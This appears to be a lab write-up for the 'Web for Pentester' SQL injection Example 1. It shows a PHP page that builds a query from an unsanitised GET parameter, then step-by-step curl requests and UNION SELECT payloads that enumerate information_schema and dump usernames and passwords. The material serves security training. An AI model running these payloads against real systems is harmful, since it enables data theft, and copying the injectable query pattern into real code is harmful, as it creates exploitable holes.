# Example1

## Code

```php
<?php

  require_once('../header.php');
  require_once('db.php');
	$sql = "SELECT * FROM users where name='";
	$sql .= $_GET["name"]."'";	
	$result = mysql_query($sql);
	if ($result) {
		?>
		<table class='table table-striped'>
      <tr><th>id</th><th>name</th><th>age</th></tr>
		<?php
		while ($row = mysql_fetch_assoc($result)) {
			echo "<tr>";
    			echo "<td>".$row['id']."</td>";
    			echo "<td>".$row['name']."</td>";
    			echo "<td>".$row['age']."</td>";
			echo "</tr>";
		}	
		echo "</table>";
	}
  require_once '../footer.php';
?>
```

## Writeup

In this code will be created the **statement SQL** with an input **not-sanitized** and will be sent to the MySQL DBMS.

If the query will give some result a table will be printed, otherwise nothing will be printed.

We can insert an **`** to crash the application and not print the table:

```bash
curl -X GET "http://web-for-pentester/sqli/example1.php?name=root'"
```

We now know that there is a **sql injection**, we can use it to print all the value of the table:

```sql
root' or 1=1#
```

This will be the command:

```bash
curl -X GET "http://web-for-pentester/sqli/example1.php?name=root'%20or%201=1%23"
```

With this output:

```html
<table class='table table-striped'>
    <tr><th>id</th><th>name</th><th>age</th></tr>
    <tr><td>1</td><td>admin</td><td>10</td></tr>
    <tr><td>2</td><td>root</td><td>30</td></tr>
    <tr><td>3</td><td>user1</td><td>5</td></tr>
    <tr><td>5</td><td>user2</td><td>2</td></tr>
</table>
<footer>
    <p>&copy; PentesterLab 2013</p>
</footer>
```

We can explore the entire table. Let's find the number of the reflected columns:

```sql
root' ORDER BY 1,2,3,4,5
```

Or by using:

```sql
root' UNION SELECT NULL,NULL,NULL,NULL,NULL %23
```

After some attemps we can find that the number of the columns are **5**.

We can know show witch of these are reflected:

```sql
root' UNION SELECT 1,2,3,4,5 %23
```

We can know find the name of the tables:

```sql
root' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema='exercises'%23
```

With these result:

```html
<table class='table table-striped'>
	<tr><th>id</th><th>name</th><th>age</th></tr>
	<tr><td>2</td><td>root</td><td>30</td></tr>
	<tr><td>users</td><td>2</td><td>3</td></tr>
</table>
```

The table name is **users**.

We can know find all of his columns:

```sql
root' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='users'%23
```

With these result:

```html
<table class='table table-striped'>
    <tr><th>id</th><th>name</th><th>age</th></tr>
	<tr><td>2</td><td>root</td><td>30</td></tr>
	<tr><td>id</td><td>2</td><td>3</td></tr>
	<tr><td>name</td><td>2</td><td>3</td></tr>
	<tr><td>age</td><td>2</td><td>3</td></tr>
	<tr><td>groupid</td><td>2</td><td>3</td></tr>
	<tr><td>passwd</td><td>2</td><td>3</td></tr>
</table>
```

We can use a single column to show **id**, **name** and **passwd**:

```sql
root' UNION SELECT concat(id, ':', name, ':', passwd),2,3,4,5 FROM users%23
```

With these result:

```html
<table class='table table-striped'>
    <tr><th>id</th><th>name</th><th>age</th></tr>
	<tr><td>2</td><td>root</td><td>30</td></tr>
	<tr><td>1:admin:admin</td><td>2</td><td>3</td></tr>
	<tr><td>2:root:admin21</td><td>2</td><td>3</td></tr>
	<tr><td>3:user1:secret</td><td>2</td><td>3</td></tr>
	<tr><td>5:user2:azerty</td><td>2</td><td>3</td></tr>
</table>
```